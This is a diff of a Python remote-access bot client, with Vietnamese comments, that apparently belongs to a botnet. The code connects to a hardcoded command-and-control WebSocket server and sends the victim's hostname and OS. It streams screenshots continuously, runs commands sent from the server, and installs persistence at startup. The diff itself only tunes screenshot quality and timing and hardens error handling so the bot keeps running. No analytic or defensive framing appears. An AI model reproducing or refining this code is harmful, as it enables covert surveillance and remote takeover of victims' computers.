@@ -67,14 +67,13 @@ VERSION = config.get("version", "1.0.0")
 SERVER_URL = config.get("server_url")
 
 print("=" * 60)
-print(f"  BOT CLIENT STARTED")
+print("  BOT CLIENT STARTED")
 print(f"  Bot ID: {BOT_ID}")
 print(f"  Server: {SERVER_URL}")
 print("=" * 60)
 
 # --- Hàm thực thi lệnh ---
 def exec_ping():
-    """Trả về ping latency"""
     return f"{random.randint(5, 50)}ms"
 
 def exec_ps(command):
@@ -244,13 +243,12 @@ COMMANDS = {
 
 # --- Stream screenshots ---
 async def stream_screenshots(websocket):
-    """Gửi ảnh màn hình liên tục"""
     try:
         print("📸 Bắt đầu stream screenshots...")
         while True:
             screenshot = pyautogui.screenshot()
             buffer = io.BytesIO()
-            screenshot.save(buffer, format="JPEG", quality=30)
+            screenshot.save(buffer, format="JPEG", quality=20)
             img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
             
             await websocket.send(json.dumps({
@@ -259,7 +257,7 @@ async def stream_screenshots(websocket):
                 "image": f"data:image/jpeg;base64,{img_base64}",
                 "timestamp": time.time()
             }))
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.5)
     except asyncio.CancelledError:
         print("📸 Stream stopped")
         raise
@@ -276,7 +274,6 @@ async def handle_command(cmd_data):
     if not cmd:
         return None
     
-    # Tách lệnh chính
     parts = cmd.split()
     main_cmd = parts[0]
     
@@ -290,7 +287,6 @@ async def handle_command(cmd_data):
         }
     
     try:
-        # Xử lý từng lệnh
         if main_cmd == "ps":
             result = exec_ps(" ".join(parts[1:]))
         elif main_cmd == "download":
@@ -320,7 +316,7 @@ async def handle_command(cmd_data):
         else:
             result = COMMANDS[main_cmd](*args)
         
-        print(f"✅ Kết quả: {result[:100]}...")
+        print(f"✅ Kết quả: {str(result)[:100]}...")
         return {
             "cmd_id": cmd_id,
             "result": result,
@@ -347,7 +343,10 @@ async def bot_loop():
         SERVER_URL = "wss://c2-server-exj9.onrender.com/ws"
     
     reconnect_delay = 0
-    screen = pyautogui.size()
+    try:
+        screen = pyautogui.size()
+    except:
+        screen = type('obj', (object,), {'width': 1920, 'height': 1080})()
     
     while True:
         try:
@@ -363,8 +362,8 @@ async def bot_loop():
                     "version": VERSION,
                     "os": platform.system(),
                     "hostname": platform.node(),
-                    "screen_width": screen.width,
-                    "screen_height": screen.height
+                    "screen_width": screen.width if hasattr(screen, 'width') else 1920,
+                    "screen_height": screen.height if hasattr(screen, 'height') else 1080
                 }))
                 print("📝 Đã gửi đăng ký bot")
                 
@@ -425,7 +424,6 @@ async def bot_loop():
                                         print(f"📤 Đã gửi kết quả cho lệnh {result['cmd_id']}")
                                         
                         except asyncio.TimeoutError:
-                            # Timeout thì tiếp tục heartbeat
                             pass
                         except websockets.exceptions.ConnectionClosed:
                             print("⚠️ Mất kết nối WebSocket")
@@ -501,10 +499,13 @@ if __name__ == "__main__":
         setup_persistence()
         print("🚀 Bot đang chạy...")
         
-        asyncio.run(bot_loop())
-        
-    except KeyboardInterrupt:
-        print("\n🛑 Bot đã dừng")
+        try:
+            asyncio.run(bot_loop())
+        except KeyboardInterrupt:
+            print("\n🛑 Bot đã dừng")
+        except Exception as e:
+            logging.error(f"Loop error: {e}")
+            print(f"❌ Lỗi loop: {e}")
     except Exception as e:
-        print(f"❌ Lỗi: {e}")
         logging.error(f"Fatal error: {e}")
+        print(f"❌ Lỗi nghiêm trọng: {e}")
